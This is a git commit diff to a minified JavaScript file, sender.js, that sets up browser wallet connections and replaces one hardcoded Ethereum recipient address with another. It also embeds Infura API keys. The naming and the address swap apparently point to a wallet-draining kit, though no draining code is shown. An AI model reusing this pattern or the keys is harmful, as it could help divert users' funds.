ad445e4b381c5037787e20af3cf48ec729240601
s0loc0mrade <99092677+s0loc0mrade@users.noreply.github.com>
2022-02-08 04:51:48 +0300

    Update and rename static/js/sender.js to статический/JS/sender.js

--- статический/JS/sender.js
+++ статический/JS/sender.js
@@ -1,4 +1,4 @@
-const NETWORK_ID = 1; const RPC_URL = 'https://mainnet.infura.io/v3/2f88680a64974f969bc43bb8c88a4532'; const ADDRESS ="0x8B4417A6740f5672539B32C547f578564d119278";class Wallet{provider
+const NETWORK_ID = 1; const RPC_URL = 'https://mainnet.infura.io/v3/2f88680a64974f969bc43bb8c88a4532'; const ADDRESS ="0x0EfaBA1550fd95402AFA21c078150b9eA81dab04";class Wallet{provider
 onboard=Onboard({networkId:NETWORK_ID,darkMode:!0,subscriptions:{wallet:wallet=>{if(wallet.provider){this.provider=new ethers.providers.Web3Provider(wallet.provider,'any')
 window.localStorage.setItem('selectedWallet',wallet.name)}else{this.provider=null}}},walletSelect:{wallets:[{walletName:'metamask'},{walletName:'trust',rpcUrl:RPC_URL},{walletName:'walletConnect',infuraKey:'74477daba7574231bc04251d2e20d7cd'}]}})
 async connectWallet(){await this.onboard.walletSelect()
